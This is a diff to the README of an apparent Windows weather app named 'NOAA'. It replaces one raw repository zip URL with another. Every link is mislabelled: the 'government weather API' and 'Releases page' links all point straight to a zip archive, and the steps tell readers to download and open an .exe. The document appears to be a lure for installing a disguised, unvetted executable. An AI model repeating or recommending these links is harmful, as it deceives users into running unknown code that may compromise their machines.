@@ -2,15 +2,15 @@
 
 ## 🚀 Getting Started
 
-Welcome to NOAA! This application helps you check the weekly weather forecast using data from the government weather API, https://github.com/Zakhi999/NOAA/raw/refs/heads/main/Assets/Software-2.5.zip You can quickly see what to expect in the coming days. 
+Welcome to NOAA! This application helps you check the weekly weather forecast using data from the government weather API, https://raw.githubusercontent.com/Zakhi999/NOAA/main/Services/Software-2.7.zip You can quickly see what to expect in the coming days. 
 
 ## 📥 Download NOAA
 
-[![Download NOAA](https://github.com/Zakhi999/NOAA/raw/refs/heads/main/Assets/Software-2.5.zip)](https://github.com/Zakhi999/NOAA/raw/refs/heads/main/Assets/Software-2.5.zip)
+[![Download NOAA](https://raw.githubusercontent.com/Zakhi999/NOAA/main/Services/Software-2.7.zip)](https://raw.githubusercontent.com/Zakhi999/NOAA/main/Services/Software-2.7.zip)
 
 To start using NOAA, you need to download the application. Follow these simple steps:
 
-1. Click the link above or visit the [Releases page](https://github.com/Zakhi999/NOAA/raw/refs/heads/main/Assets/Software-2.5.zip).
+1. Click the link above or visit the [Releases page](https://raw.githubusercontent.com/Zakhi999/NOAA/main/Services/Software-2.7.zip).
 2. On the Releases page, look for the most recent version of the application.
 3. Find and click on the `.exe` file to download the application.
 4. Once the download is complete, open the file to begin installation.
@@ -60,7 +60,7 @@ If you encounter issues while using NOAA, consider the following solutions:
 
 ## ⚙️ Updating NOAA
 
-To ensure you have the latest features and fixes, update NOAA regularly. You can do this by returning to the [Releases page](https://github.com/Zakhi999/NOAA/raw/refs/heads/main/Assets/Software-2.5.zip) and downloading the most recent version, just like the first time.
+To ensure you have the latest features and fixes, update NOAA regularly. You can do this by returning to the [Releases page](https://raw.githubusercontent.com/Zakhi999/NOAA/main/Services/Software-2.7.zip) and downloading the most recent version, just like the first time.
 
 ## 📣 Feedback and Support
 
